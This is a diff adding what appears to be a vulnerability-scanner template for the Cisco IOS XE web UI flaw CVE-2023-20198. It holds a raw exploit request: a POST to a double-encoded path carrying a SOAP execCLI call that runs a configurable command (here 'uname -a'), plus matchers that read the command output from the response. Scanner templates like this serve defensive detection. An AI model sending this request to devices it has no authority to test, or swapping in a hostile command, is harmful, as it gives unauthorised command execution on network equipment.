@@ -1,0 +1,53 @@
+id: cisco-iosxe-webui-privilege-escalation
+info:
+  name: Cisco IOS XE Web UI Privilege Escalation
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-20198
+variables:
+  cmd: "uname -a"
+http:
+  - raw:
+      - |
+        POST /%2577eb%2575i_%2577sma_Http HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0"?>
+        <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+          <SOAP:Header>
+            <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
+              <wsse:UsernameToken SOAP:mustUnderstand="false">
+                <wsse:Username>admin</wsse:Username>
+                <wsse:Password>*****</wsse:Password>
+              </wsse:UsernameToken>
+            </wsse:Security>
+          </SOAP:Header>
+          <SOAP:Body>
+            <request correlator="exec1" xmlns="urn:cisco:wsma-exec">
+              <execCLI xsd="false">
+                <cmd>{{cmd}}</cmd>
+                <dialogue>
+                  <expect></expect>
+                  <reply></reply>
+                </dialogue>
+              </execCLI>
+            </request>
+          </SOAP:Body>
+        </SOAP:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "XMLSchema"
+          - "execLog"
+          - "Cisco Systems"
+          - "<text>"
+      - type: regex
+        part: body
+        regex:
+          - "<text>\\n(.*)\\["
